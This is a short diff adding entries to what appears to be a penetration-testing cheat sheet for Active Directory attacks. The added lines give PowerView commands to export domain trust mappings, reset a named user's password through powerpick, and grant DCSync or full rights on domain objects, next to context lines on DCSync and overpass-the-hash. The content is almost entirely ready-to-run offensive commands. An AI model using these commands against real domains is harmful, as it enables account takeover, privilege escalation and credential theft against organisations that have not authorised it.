@@ -44,6 +44,10 @@ Bloodhound/Neo4J
   
 PowerView
   Trusts: Get-DomainTrust -SearchBase “GC://$($ENV:USERDNSDOMAIN)”
+  Trust Mapping: Get-DomainTrustMapping to | Export-CSV -NoTypeInformation trusts.csv
+  Change User PW: powerpick $newpwd = ConvertTo-SecureString -String "Password1!" -AsPlainText –Force; Set-DomainUserPassword -Identity <username> -AccountPassword $newpwd
+  Change ACL Perms: Add-DomainObjectAcl -TargetIdentity <domain|user|computer> -PrincipalIdentity <user|computer> -Rights <DCSync|All> -Verbose
+
 
 Overpass the Hash
   dcsync fqdn domain\user (User must have DCSync rights in that domain)
